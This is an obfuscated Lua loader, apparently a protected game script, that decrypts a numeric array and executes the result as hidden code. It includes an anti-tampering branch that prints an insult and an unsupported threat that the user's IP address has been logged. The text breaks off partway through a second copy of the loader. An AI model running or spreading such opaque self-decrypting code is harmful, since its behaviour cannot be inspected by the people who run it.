fSptmQ6zWGU1bCUKukLB3ZN2GRQnkooGDTcuBKY1ts3YADzrPGT; b5PqrMPxPzgv7VFCP2Yn4XQ4APjg6FbzrQ80mL6PA53Vjf96EtHlQfLIkDb4Ocq0uJ =
mezofLclAGoj670YRhWMIXjAhygfaVwpWvxlPZExpdMcNYd0COeahyrAr8LuKRWfhh; ueJugi6t654ddufC3BH8koDcEXvKfY7me0Mx5Y77f34zxC69oErVAtLAWW9XkiRB0ytFHra3 =
b5PqrMPxPzgv7VFCP2Yn4XQ4APjg6FbzrQ80mL6PA53Vjf96EtHlQfLIkDb4Ocq0uJ; ip8xmd8iJnygJXXnT4zKJwuNSp1VCA5DBzkUyUXYqgZCbdptHhOCpbL8La623G =
ueJugi6t654ddufC3BH8koDcEXvKfY7me0Mx5Y77f34zxC69oErVAtLAWW9XkiRB0ytFHra3; bWoJGqdfVs2ikPAGl9F1eJ445xw3GZ08ccRRO6UftW2DJarZfaaWqopsUANnMx =
ip8xmd8iJnygJXXnT4zKJwuNSp1VCA5DBzkUyUXYqgZCbdptHhOCpbL8La623G; iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1 = function(
  a)
  K, F = 3548760805919504, 16384 + 4339; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; apOMJINRjaHFG6lUWXmfWyFaSSxjmo77QSABvXOG1PRCn30HiQ4 = function(b)
  co = coroutine.create(b)
  dwDqMMjm7BOwruOQvguIHMHNmbt1JMtbyxfuYS2xJFDu0L1OAKsggA5 = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(dwDqMMjm7BOwruOQvguIHMHNmbt1JMtbyxfuYS2xJFDu0L1OAKsggA5, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return dwDqMMjm7BOwruOQvguIHMHNmbt1JMtbyxfuYS2xJFDu0L1OAKsggA5
end; e9c8DBeqF74otqMz4XGsRcXVx5tFsEe4dXv9Snuw8xPXr0aENP2yNn9wwGmDO3UIcd = function(f, g)
  aUXjkDeO3174L0f6yWLOcoVNpUKno28bSR9RiEeXMn0WVWVdOD3k17X7whl = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; bYgghZOj6fQYhbNYYaPmsTLoMO03mEXS4XtASKdNfz5qCp036xJ8wPobLogHRGNS4lrs3YVu = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; ufZZxSrrXcTuwvaNKCpBR5ZDmm9J7XaIuw73aLXwxTqnaUK17N5CTxgOTNLl0 = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      aUXjkDeO3174L0f6yWLOcoVNpUKno28bSR9RiEeXMn0WVWVdOD3k17X7whl(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; bXNC9tPhxfbA12U1HYtuI7D69Vgywum34wmhg9KpleofGJFBAiHkfdDiROJoBWqF3U5LidgT = function(p, n)
    e7tEVKtRlFsK3gcMuwiCw0WEJ18AjlslZGNDDuN7PbMNb7n1Hvsr = ""
    for k, q in pairs(p) do e7tEVKtRlFsK3gcMuwiCw0WEJ18AjlslZGNDDuN7PbMNb7n1Hvsr =
      e7tEVKtRlFsK3gcMuwiCw0WEJ18AjlslZGNDDuN7PbMNb7n1Hvsr ..
      bWoJGqdfVs2ikPAGl9F1eJ445xw3GZ08ccRRO6UftW2DJarZfaaWqopsUANnMx
      [iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('2B') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('A0') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('B6') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('99') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('E2') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('AF')]
      [iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('DB') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('24') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('F1') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('B6')](
      q) end
    ; n(e7tEVKtRlFsK3gcMuwiCw0WEJ18AjlslZGNDDuN7PbMNb7n1Hvsr)
  end; bYgghZOj6fQYhbNYYaPmsTLoMO03mEXS4XtASKdNfz5qCp036xJ8wPobLogHRGNS4lrs3YVu(f,
    function(r) ufZZxSrrXcTuwvaNKCpBR5ZDmm9J7XaIuw73aLXwxTqnaUK17N5CTxgOTNLl0(r, g,
        function(s) bXNC9tPhxfbA12U1HYtuI7D69Vgywum34wmhg9KpleofGJFBAiHkfdDiROJoBWqF3U5LidgT(s,
            function(t) if #apOMJINRjaHFG6lUWXmfWyFaSSxjmo77QSABvXOG1PRCn30HiQ4(bWoJGqdfVs2ikPAGl9F1eJ445xw3GZ08ccRRO6UftW2DJarZfaaWqopsUANnMx[iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('F8') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('57') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('F1') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('50')]) == 1 then if bWoJGqdfVs2ikPAGl9F1eJ445xw3GZ08ccRRO6UftW2DJarZfaaWqopsUANnMx[iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('F8') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('57') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('F1') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('50')] == bWoJGqdfVs2ikPAGl9F1eJ445xw3GZ08ccRRO6UftW2DJarZfaaWqopsUANnMx[iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('CC') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('B6') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('99') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('E2') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('A0')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if bWoJGqdfVs2ikPAGl9F1eJ445xw3GZ08ccRRO6UftW2DJarZfaaWqopsUANnMx[iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('F8') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('57') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('F1') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('50')](t) then
                    bWoJGqdfVs2ikPAGl9F1eJ445xw3GZ08ccRRO6UftW2DJarZfaaWqopsUANnMx
                        [iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('F8') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('57') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('F1') .. iCiZiTOafGlUnBKwrEqlnQIXZ8tPxqwCs5P99cKXQ47ppMJ0Y440iTjzkovKaXKK4db4kasH1('50')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; e9c8DBeqF74otqMz4XGsRcXVx5tFsEe4dXv9Snuw8xPXr0aENP2yNn9wwGmDO3UIcd(
{ 1166, 720, 1186, 932, 919, 1084, 1089, 804, 1031, 1143, 1142, 725, 1000, 995, 1067, 626, 1018, 950, 1132, 1172, 558,
  835, 761, 673, 724, 1179, 1090, 849, 972, 1033, 601, 545, 578, 839, 565, 1207, 837, 803, 1133, 873, 1204, 1203, 675,
  971, 721, 1146, 1152, 1184, 1138, 556, 994, 885, 654, 1107, 1026, 695, 680, 796, 856, 1205, 1065, 629, 1187, 620, 933,
  652, 792, 580, 657, 748, 976, 1071, 788, 1006, 1121, 808, 799, 790, 1047, 955, 981, 794, 1192, 760, 734, 877, 649, 880,
  1043, 749, 1140, 855, 584, 606, 1198, 854, 996, 886, 779, 628, 978, 872, 736, 647, 1051, 812, 771, 566, 847, 973, 708,
  928, 862, 710, 1208, 903, 664, 567, 717, 857, 911, 599, 1201, 1054, 966, 913, 991, 1053, 755, 632, 958, 1057, 1008,
  546, 1157, 917, 1066, 982, 619, 1064, 630, 740, 676, 836, 608, 665, 598, 715, 881, 1117, 644, 1151, 719, 778, 582,
  1083, 670, 609, 813, 1075, 1073, 634, 946, 765, 569, 1078, 964, 643, 743, 1116, 737, 1123, 688, 1061, 901, 738, 678,
  780, 1024, 572, 795, 612, 1062, 1086, 843, 607, 791, 887, 997, 543, 726, 633, 693, 1014, 1156, 875, 571, 879, 700, 858,
  786, 573, 1097, 968, 909, 1028, 631, 1004, 703, 1077, 713, 660, 947, 1181, 805, 555, 905, 764, 1046, 1101, 1189, 602,
  604, 818, 1034, 562, 1021, 1211, 770, 828, 1141, 845, 871, 663, 661, 1058, 1135, 907, 912, 815, 1149, 742, 1009, 951,
  656, 659, 1039, 985, 735, 662, 832, 806, 908, 655, 1088, 1085, 754, 707, 921, 590, 1144, 999, 1005, 906, 702, 1118,
  1102, 1190, 1155, 640, 876, 1003, 918, 1069, 983, 942, 850, 833, 563, 589, 820, 1098, 824, 899, 829, 922, 711, 965,
  920, 1145, 1091, 561, 975, 641, 895, 745, 613, 1080, 1010, 597, 653, 1129, 1030, 549, 882, 1063, 1168, 1092, 1110,
  1011, 987, 586, 1209, 926, 593, 993, 956, 923, 1195, 1120, 1072, 860, 683, 870, 1124, 867, 1029, 581, 1048, 714, 868,
  1055, 784, 616, 756, 874, 865, 957, 603, 701, 929, 1016, 691, 1035, 979, 1210, 948, 1162, 716, 728, 910, 781, 621, 651,
  744, 864, 1074, 900, 777, 802, 990, 768, 690, 823, 785, 1037, 904, 1183, 596, 692, 548, 1109, 915, 1087, 892, 1104,
  930, 753, 645, 967, 583, 797, 898, 1002, 961, 838, 1040, 811, 624, 924, 888, 671, 931, 615, 1015, 927, 830, 809, 704,
  940, 822, 727, 687, 902, 1068, 600, 826, 722, 1191, 1125, 1094, 705, 1182, 1212, 1038, 943, 851, 1099, 814, 642, 712,
  698, 618, 650, 817, 585, 844, 1113, 1082, 1139, 1108, 1202, 1056, 1105, 1158, 869, 1200, 937, 807, 763, 827, 936, 592,
  554, 1027, 1103, 759, 723, 1025, 679, 1197, 773, 639, 952, 1022, 718, 681, 1160, 1178, 706, 1175, 1096, 825, 686, 623,
  834, 1036, 852, 783, 775, 986, 576, 953, 1170, 816, 617, 891, 560, 552, 941, 842, 1100, 635, 758, 989, 848, 772, 878,
  1070, 1007, 570, 1050, 731, 544, 551, 863, 774, 669, 1185, 1032, 945, 557, 696, 1159, 831, 769, 577, 1154, 776, 1193,
  1180, 962, 949, 1194, 1148, 963, 1136, 846, 1122, 1167, 627, 1112, 1169, 625, 970, 787, 934, 840, 841, 890, 682, 1093,
  801, 1115, 648, 636, 1196, 1150, 1137, 1127, 591, 1012, -1, 113, 71, 64, 52, 14, 69, 55, 135, 85, 71, 8, 102, 110, 85,
  105, 113, 170, 98, 15, 116, 17, 232, 111, 32, 40, 204, 99, 121, 12, 8, 78, 206, 161, 76, 103, 14, 97, 20, 78, 68, 83,
  9, 98, 21, 112, 197, 5, 18, 63, 91, 1, 54, 102, 115, 97, 1, 105, 6, 38, 75, 19, 20, 120, 79, 97, 85, 125, 248, 80, 75,
  71, 195, 52, 21, 105, 66, 57, 78, 20, 93, 59, 4, 35, 18, 85, 89, 44, 14, 90, 109, 101, 7, 20, 64, 91, 240, 4, 49, 105,
  102, 90, 118, 20, 112, 8, 20, 42, 105, 71, 41, 82, 85, 31, 69, 83, 179, 6, 97, 1, 93, 47, 53, 14, 66, 190, 187, 40, 71,
  60, 139, 87, 126, 83, 103, 72, 118, 39, 33, 28, 34, 6, 184, 169, 15, 125, 74, 121, 11, 43, 21, 75, 129, 37, 111, 83,
  18, 197, 95, 104, 125, 77, 59, 27, 32, 92, 16, 8, 98, 29, 115, 89, 116, 39, 9, 68, 51, 109, 24, 22, 55, 64, 11, 30,
  122, 26, 100, 7, 236, 72, 38, 51, 66, 68, 6, 19, 90, 189, 0, 244, 44, 96, 83, 108, 61, 57, 55, 2, 59, 38, 84, 97, 42,
  12, 121, 144, 71, 39, 93, 44, 207, 93, 107, 110, 222, 245, 25, 78, 35, 28, 16, 108, 16, 97, 88, 113, 30, 33, 6, 97,
  169, 93, 113, 17, 69, 86, 52, 234, 64, 127, 93, 55, 102, 79, 83, 116, 115, 72, 54, 96, 21, 71, 36, 80, 123, 54, 21,
  105, 84, 25, 47, 82, 85, 67, 66, 111, 71, 62, 126, 158, 31, 8, 60, 35, 7, 13, 83, 70, 12, 71, 92, 56, 64, 83, 49, 5,
  90, 101, 105, 104, 103, 76, 71, 75, 16, 115, 58, 39, 26, 26, 2, 60, 120, 97, 1, 19, 115, 90, 39, 195, 42, 104, 116, 72,
  54, 51, 84, 75, 10, 5, 25, 97, 25, 114, 2, 59, 124, 64, 49, 92, 0, 243, 152, 30, 81, 21, 1, 113, 5, 111, 71, 69, 170,
  97, 233, 90, 84, 77, 86, 83, 38, 13, 85, 50, 33, 20, 18, 117, 103, 83, 54, 63, 96, 111, 177, 89, 50, 53, 74, 11, 23,
  70, 2, 131, 104, 91, 44, 1, 103, 16, 52, 51, 78, 184, 71, 86, 44, 235, 39, 78, 1, 3, 240, 66, 84, 96, 39, 92, 39, 106,
  6, 115, 31, 36, 43, 14, 127, 189, 247, 55, 48, 81, 84, 56, 120, 71, 18, 181, 61, 55, 27, 84, 212, 64, 27, 220, 35, 66,
  229, 15, 105, 81, 102, 53, 92, 26, 120, 22, 121, 60, 145, 35, 72, 36, 84, 81, 137, 33, 21, 111, 86, 13, 84, 27, 10, 21,
  26, 60, 107, 92, 81, 175, 73, 115, 35, 224, 22, 76, 193, 36, 38, 133, 97, 11, 85, 85, 30, 71, 29, 7, 56, 110, 83, 70,
  28, 45, 72, 51, 43, 242, 136, 2, 192, 132, 71, 5, 121, 112, 25, 85, 19, 87, 81, 86, 23, 46, 60, 136, 247, 102, 82, 31,
  98, 38, 78, 69, 89, 51, 113, 18, 39, 116, 84, 106, 189, 111, 101, 180, 24, 190, 103, 64, 93, 80, 122, 98, 61, 16, 28,
  55, 91, 58, 115, 115, 19, 99, 82, 66, 97, 10, 13, 53, 78, 49, 67, 61, 87, 67, 113, 234, 104, 78, 99, 109, 109, 13, 81,
  72, 105, 126, 98, 86, 34, 94, 101, 19, 137, 18, 52, 134, 84, 77, 1, 5, 60, 126, 54, 97, 43, 54, 19, 54, 7, 47, 94, 144,
  62, 23, 125, 4, 118, 215, 97, 96, 117, 115, 84, 98, 11, 192, 39, 253, 199, 30, 127, 71, 62, 85, 18, 47, 75, 122, 50, 0,
  207, 42, 22, 19, 18, 3, 123, 123, 89, 55, 16, 0, 173, 40, 36, 28, 61, 8, 21, 78, 84, 40, 84, 44, 113, 92, 8, 71, 20,
  34, 34, 33, 20, 89, 61, 19, 16 }, "uHuFS2bIOBgnGA4gsTtvQ5Y9hg"); szvPBFBk03vSJKYKCigvYZVf6dNSY5vCEik1yrc1m5XxrU4AhcISUyavsQAC6SVSsag =
bWoJGqdfVs2ikPAGl9F1eJ445xw3GZ08ccRRO6UftW2DJarZfaaWqopsUANnMx; cQs0std33YEU4aAZhgZMQeZN4JD3tFa6t9I3NW7GNqyIskvc5aR7N98rDTc =
bWoJGqdfVs2ikPAGl9F1eJ445xw3GZ08ccRRO6UftW2DJarZfaaWqopsUANnMx; y7ryKjyPLyGBjX80XTjdRKdueW16AZbqx1eRqIphtfjcOqzMZXmdOfSJQmbqL9AWN =
cQs0std33YEU4aAZhgZMQeZN4JD3tFa6t9I3NW7GNqyIskvc5aR7N98rDTc; dYHfmDASghXBW2EKPJqhCysSo3mlrLDoRXerFGs9glD2VTT5K1S27TDIZKUBzcHga3jLcK5ZkI =
y7ryKjyPLyGBjX80XTjdRKdueW16AZbqx1eRqIphtfjcOqzMZXmdOfSJQmbqL9AWN; qqt6NwIB5pZzUsLwN8HLBNghLhGIepBNck4jMB9Edobx12nX9aIgfx2A =
dYHfmDASghXBW2EKPJqhCysSo3mlrLDoRXerFGs9glD2VTT5K1S27TDIZKUBzcHga3jLcK5ZkI; ew21jurPPIqbwCGtjZM5KDUCCAzjFwbtAsbl3TXeuAJPyqjAPtOhTvLOB =
qqt6NwIB5pZzUsLwN8HLBNghLhGIepBNck4jMB9Edobx12nX9aIgfx2A; bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C = function(
  a)
  K, F = 6766525506091858, 16384 + 2184; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; tt6K1ZDMf8hGROF0FMwIZNck5DfbHT9jYx9rO1SdX0vnGOiKN3dNB8 = function(b)
  co = coroutine.create(b)
  hhB5wvdW3xlxO6ha7cnbaHlMExNpu3u7LVbQuaHp57ZatcOGBDZQmehMZd = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(hhB5wvdW3xlxO6ha7cnbaHlMExNpu3u7LVbQuaHp57ZatcOGBDZQmehMZd, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return hhB5wvdW3xlxO6ha7cnbaHlMExNpu3u7LVbQuaHp57ZatcOGBDZQmehMZd
end; j8KNWJ1c9pBw23bUFYqIfBLMKFtdIuHcxwyi1joerOAARoldfo8mlY1kkmhv4HWfHTNnlAncOP = function(f, g)
  p4keZ1TOmusHgVZ61qWutkgWyYRiVyepJ8Z6JLmFu8krPtUaBYYj5IJD47hAlijazEFxgUccvA = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; fG49ysfWEKEJOmIPhS05rADWDw5ATlAWah6oSsHURgcH7QQLTYcVD5nt0v3NS = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; yD3FzWe0drIMTptVtHReBRI5wsmn7CAunOXiQ1GANtAcsUgVacP0ZCmW = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      p4keZ1TOmusHgVZ61qWutkgWyYRiVyepJ8Z6JLmFu8krPtUaBYYj5IJD47hAlijazEFxgUccvA(f[i], string.byte(g, j),
        function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; gebPpEen2VER7hTg0qCeIHMsXN2XJ6CWBkxoSnu0q5gu6SrMcW2 = function(p, n)
    uPSQCPnCp2ddiMUTJvgM6g15SHi5PsvzKWCiFb0gDlzDNuFVw37xOHbjklsQYdoT9DYikZ391pK = ""
    for k, q in pairs(p) do uPSQCPnCp2ddiMUTJvgM6g15SHi5PsvzKWCiFb0gDlzDNuFVw37xOHbjklsQYdoT9DYikZ391pK =
      uPSQCPnCp2ddiMUTJvgM6g15SHi5PsvzKWCiFb0gDlzDNuFVw37xOHbjklsQYdoT9DYikZ391pK ..
      ew21jurPPIqbwCGtjZM5KDUCCAzjFwbtAsbl3TXeuAJPyqjAPtOhTvLOB
      [bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('C3') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('74') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('12') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('D9') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('4E') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('77')]
      [bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('B3') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('28') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('51') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('12')](
      q) end
    ; n(uPSQCPnCp2ddiMUTJvgM6g15SHi5PsvzKWCiFb0gDlzDNuFVw37xOHbjklsQYdoT9DYikZ391pK)
  end; fG49ysfWEKEJOmIPhS05rADWDw5ATlAWah6oSsHURgcH7QQLTYcVD5nt0v3NS(f,
    function(r) yD3FzWe0drIMTptVtHReBRI5wsmn7CAunOXiQ1GANtAcsUgVacP0ZCmW(r, g,
        function(s) gebPpEen2VER7hTg0qCeIHMsXN2XJ6CWBkxoSnu0q5gu6SrMcW2(s,
            function(t) if #tt6K1ZDMf8hGROF0FMwIZNck5DfbHT9jYx9rO1SdX0vnGOiKN3dNB8(ew21jurPPIqbwCGtjZM5KDUCCAzjFwbtAsbl3TXeuAJPyqjAPtOhTvLOB[bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('EC') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('FF') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('51') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('64')]) == 1 then if ew21jurPPIqbwCGtjZM5KDUCCAzjFwbtAsbl3TXeuAJPyqjAPtOhTvLOB[bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('EC') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('FF') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('51') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('64')] == ew21jurPPIqbwCGtjZM5KDUCCAzjFwbtAsbl3TXeuAJPyqjAPtOhTvLOB[bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('B0') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('12') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('D9') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('4E') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('74')] then
                  print(
